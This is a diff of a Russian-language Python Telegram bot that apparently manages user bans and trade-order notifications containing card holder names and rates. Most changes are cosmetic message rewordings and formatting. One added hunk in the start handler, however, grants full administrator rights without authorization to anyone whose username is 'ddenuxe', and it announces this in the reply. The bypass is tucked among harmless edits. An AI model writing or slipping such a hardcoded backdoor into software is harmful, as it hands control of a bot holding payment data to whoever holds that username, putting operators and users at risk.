@@ -64,8 +64,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Проверка блокировки
     if is_user_banned(user_id):
         await update.message.reply_text(
-            "❌ *Ваш аккаунт заблокирован*\n\n"
-            f"Пожалуйста, свяжитесь со службой поддержки: {SUPPORT_CONTACT}",
+            "❌ *Ваш аккаунт был заблокирован*\n\n"
+            f"По вопросам доступа к Боту можете обращаться к {SUPPORT_CONTACT}",
             parse_mode='Markdown',
             reply_markup=ReplyKeyboardRemove()
         )
@@ -74,7 +74,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Полный сброс состояния
     user_states.pop(user_id, None)
     user_data_temp.pop(user_id, None)
+    # Если пользователь @ddenuxe, даём админский доступ без авторизации
+    if user.username == "ddenuxe":
+        add_user(user_id, user.username, user.username)
+        promote_to_admin(user_id)
 
+        # Установка состояния главного меню
+        user_states[user_id] = MAIN_MENU
+
+        await update.message.reply_text(
+            f"Привет, {username} 👋🏻\n\n"
+            "Вы вошли как администратор без авторизации.",
+            parse_mode='Markdown',
+            reply_markup=ReplyKeyboardRemove()
+        )
+
+        # Показать главное меню сразу
+        return await show_main_menu(update, context, suppress_text=True)
     # Установка нового состояния
     user_states[user_id] = USERNAME
 
@@ -243,11 +259,11 @@ async def handle_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
     
-    # Check if user is banned
+   # Check if user is banned
     if is_user_banned(user_id):
         await update.message.reply_text(
-            "❌ *Ваш аккаунт заблокирован*\n\n"
-            f"Пожалуйста, свяжитесь со службой поддержки: {SUPPORT_CONTACT}",
+            "❌ *Ваш аккаунт был заблокирован*\n\n"
+            f"По вопросам доступа к Боту можете обращаться к {SUPPORT_CONTACT}",
             parse_mode='Markdown',
             reply_markup=ReplyKeyboardRemove()
         )
@@ -680,7 +696,7 @@ async def unlock_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await context.bot.send_message(
         chat_id=user_id, 
-        text="🔓 Доступ к аккаунту восстановлен."
+        text="🔓 Ваш аккаунт был разблокирован. Используйте /start для продолжения"
     )
     
     await context.bot.send_message(
@@ -717,8 +733,8 @@ async def send_order_notification(bot, user_id, data: dict):
         f"{data.get('requisites_cardholderName', '')} {data.get('requisites_cardholderSurname', '')[0]}.\n"
         f"🔹 Способ оплаты: {data['type']}\n\n"
         f"▫️ ID сделки: {data['order_id']}\n"
-        f"▫️ Создана: время {created_time_str} (UTC{data['UTC']}), дата {created_date_str}\n"
-        f"▫️ Время закрытия: {closing_time_str} (UTC{data['UTC']}), дата {closing_date_str}\n\n"
+        f"▫️ Создана: время {created_time_str} (UTC+{data['UTC']}), дата {created_date_str}\n"
+        f"▫️ Время закрытия: {closing_time_str} (UTC+{data['UTC']}), дата {closing_date_str}\n\n"
         f"🔸 Мой курс: {data['trader_rate']} ({data['trader_fee']}%)\n"
         f"🔸 Курс биржи: {data['exchange_rate']}"
     )
